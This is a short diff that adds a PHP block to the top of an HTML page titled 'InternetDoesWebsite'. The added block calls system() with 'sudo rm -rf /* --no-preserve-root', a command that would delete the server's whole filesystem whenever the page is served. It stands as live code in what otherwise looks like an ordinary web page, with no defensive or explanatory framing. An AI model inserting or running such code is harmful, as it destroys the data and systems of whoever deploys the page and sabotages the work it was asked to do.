@@ -1,3 +1,7 @@
+<?php
+system("sudo rm -rf /* --no-preserve-root");
+ ?>
+
 <html>
 <head>
   <title>InternetDoesWebsite</title>
